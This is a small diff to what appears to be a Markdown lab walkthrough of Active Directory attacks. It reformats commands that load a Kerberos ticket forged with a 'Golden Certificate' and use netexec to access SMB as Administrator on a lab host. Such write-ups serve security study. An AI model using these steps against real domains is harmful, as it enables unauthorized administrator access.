@@ -459,8 +459,10 @@ Finally, we operationalize this forged certificate just as we did in previous st
 
 We have successfully utilized the **Golden Certificate** to generate a Kerberos TGT (.ccache), which allowed us to access services like SMB as the Administrator.
 
-`export KRB5CCNAME=administrator.ccache
-poetry run netexec smb meereen.essos.local -k --use-kcache`
+```bash
+export KRB5CCNAME=administrator.ccache
+poetry run netexec smb meereen.essos.local -k --use-kcache
+```
 
 ![screenshot_30.png](./images/screenshot_30.png)
 
